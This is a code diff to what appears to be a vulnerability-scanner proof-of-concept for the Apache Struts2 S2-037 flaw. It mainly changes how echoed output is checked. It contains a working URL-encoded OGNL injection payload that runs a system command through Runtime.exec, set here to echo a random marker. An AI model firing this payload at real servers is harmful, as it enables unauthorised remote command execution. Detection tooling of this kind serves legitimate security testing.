@@ -4,12 +4,10 @@
 # @File    : poc_struts2_037.py
 
 
-import copy,random,re
+import copy
 from myscan.lib.helper.request import request
-from myscan.lib.core.common import get_random_num,get_random_str
-from myscan.lib.parse.dictdata_parser import dictdata_parser
+from myscan.lib.core.common import get_random_str,check_echo
 from myscan.lib.parse.response_parser import response_parser
-from myscan.config import scan_set
 
 
 class POC():
@@ -23,10 +21,12 @@ class POC():
 
     def verify(self):
         # 添加限定条件
-        if self.dictdata.get("url").get("extension").lower() not in ["", "do", "action", ""]:
+        if self.dictdata.get("url").get("extension").lower() not in ["", "do", "action"]:
             return
         headers=copy.deepcopy(self.dictdata.get("request").get("headers"))
-        random_str = get_random_str(6)
+        rs1 = get_random_str(4)
+        rs2 = get_random_str(4)
+        random_str = "{} {}".format(rs1, rs2)
 
         payloads = [
             r"%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=echo%20"+random_str,
@@ -47,7 +47,7 @@ class POC():
             if r != None:
                 for check in checks:
                     if check==random_str:
-                        if re.search(("[^(echo)][^ (%20)]{}|^\s*{}\s*$".format(random_str, random_str)).encode(), r.content):
+                        if check_echo(r.content,rs1,rs2):
                             self.save(r)
                             return
                     else:
